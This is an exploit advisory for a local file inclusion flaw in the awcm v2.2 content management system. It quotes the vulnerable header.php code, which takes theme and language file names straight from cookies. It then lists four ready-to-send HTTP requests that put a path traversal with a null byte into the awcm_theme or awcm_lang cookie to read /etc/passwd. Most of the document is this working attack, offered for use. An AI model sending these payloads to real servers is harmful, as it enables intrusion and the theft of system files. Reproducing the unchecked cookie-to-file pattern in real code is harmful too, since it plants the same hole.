@@ -1,0 +1,54 @@
+[+]Exploit Title: [awcm v2.2 final Local File Inclusion]
+[+]Date: [26-01-2011]
+[+]Author: Cucura , Ste@lth (Bl@ck_Falc0n)
+[+]Software Link: [www.awcm-cms.com]
+[+]Version: [v2.2]
+[+]CVE : - 
+[+]Contact: Blackcucura[at]Gmail.com
+http://sourceforge.net/projects/awcm/files/
+-----------------------------------------------------------------
+
+Vuln C0de  in header.php
+
+if(isset($_COOKIE['awcm_theme'])) {
+	$theme_file = $_COOKIE['awcm_theme'];
+} else {
+	$theme_file = $mysql_maininfo_row['defult_theme'];
+}
+
+if(isset($_COOKIE['awcm_lang'])) {
+	$lang_file = $_COOKIE['awcm_lang'];
+} else {
+	$lang_file = $mysql_maininfo_row['defult_language'];
+}
+
+
+-----------------------------------------------------------------
+
+
+[+]Exploit: http://target/awcm/index.php
+
+	GET http://192.168.43.173/awcm/index.php HTTP/1.0
+	Cookie: awcm_theme=../../../../etc/passwd%00; 
+
+
+[+]Exploit: http://target/awcm/index.php
+
+	GET http://192.168.43.173/awcm/index.php HTTP/1.0
+	Cookie: awcm_lang=../../../../etc/passwd%00; 
+
+
+[+]Exploit: http://target/awcm/header.php
+
+	GET http://192.168.43.173/awcm/header.php HTTP/1.0
+	Cookie: awcm_lang=../../../../etc/passwd%00; 
+
+
+[+]Exploit: http://target/awcm/header.php
+
+	GET http://192.168.43.173/awcm/header.php HTTP/1.0
+	Cookie: awcm_theme=../../../../etc/passwd%00; 
+
+
+-----------------------------------------------------------------
+Greetz : SpeeDr00t, ReDr0se, InsideJ , eidisky Bl@ck Falc0n Team
